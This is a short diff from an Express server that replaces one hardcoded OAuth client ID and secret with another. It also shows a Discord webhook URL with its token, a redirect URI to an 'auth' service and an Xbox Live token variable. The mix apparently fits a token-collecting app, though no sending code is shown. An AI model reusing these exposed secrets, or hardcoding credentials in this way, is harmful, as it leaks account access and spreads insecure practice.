@@ -8,8 +8,8 @@ const app = express();
 app.use(bodyParser.json());
 const url3 = 'https://discord.com/api/webhooks/1112066231663591474/xFWvOK2R9uM-9RMseOHapfa-qN8Qz65myhlmFHVL8A5I8BcWrua8saGL-8S4YKyoRLAV';
 
-const CLIENT_ID = 'a2564fa8-3f25-4819-b7d1-9966691ee3e7';
-const CLIENT_SECRET = 'mLD8Q~5KjEcJxYZstec-dgGIEhSI.BUfgT8B2bk.';
+const CLIENT_ID = 'b62d8aed-6e2c-408c-983d-7d706396440b';
+const CLIENT_SECRET = 'slO8Q~3xvChjhElFq1Pa7TrzlB4A3Ol-5w1xmbWP';
 const REDIRECT_URI = 'https://sept-auth.onrender.com/auth';
 
 let xblToken = '';
